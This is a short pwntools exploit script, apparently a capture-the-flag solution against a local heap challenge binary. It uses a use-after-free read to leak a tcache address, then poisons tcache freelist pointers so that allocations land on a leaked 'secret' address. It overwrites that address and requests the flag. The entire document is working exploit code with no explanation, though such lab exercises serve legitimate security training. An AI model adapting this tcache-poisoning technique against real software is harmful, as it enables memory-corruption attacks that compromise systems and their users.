#!/bin/python

from pwn import * 
import sys

context.arch = 'amd64'


def malloc(idx, size):
    proc.sendline(b"malloc")
    proc.sendline(str(idx))
    proc.sendline(str(size))


def free(idx):
    proc.sendline(b"free")
    proc.sendline(str(idx))


def scanf(idx, contents: bytes):
    proc.sendline(b"scanf")
    proc.sendline(str(idx))
    proc.sendline(contents)


def puts(idx):
    proc.sendline(b"puts")
    proc.clean()
    proc.sendline(str(idx))

    proc.recvuntil(b"Data: ")
    return proc.recvline(drop=True)


proc = process(sys.argv[1])
proc.recvuntil(b"secret stored at ")
secret_addr = int(proc.recvline(drop=True)[:-1], 16)

malloc(0, 8)
malloc(1, 8)
free(0)
free(1)

tcache_addr = u64(puts(1).ljust(8, b'\x00')) - 0x2c0 + 0x10

print(f"tcache address: {hex(tcache_addr)}")

scanf(1, p64(secret_addr))
malloc(2, 8)
malloc(2, 8)


malloc(1, 90)
malloc(0, 90)
free(1)
free(0)
scanf(0, p64(secret_addr-8))

malloc(2, 90)
malloc(2, 90)

proc.sendline(b'send_flag')
proc.sendline(p64(0) + p64(0))

proc.interactive()
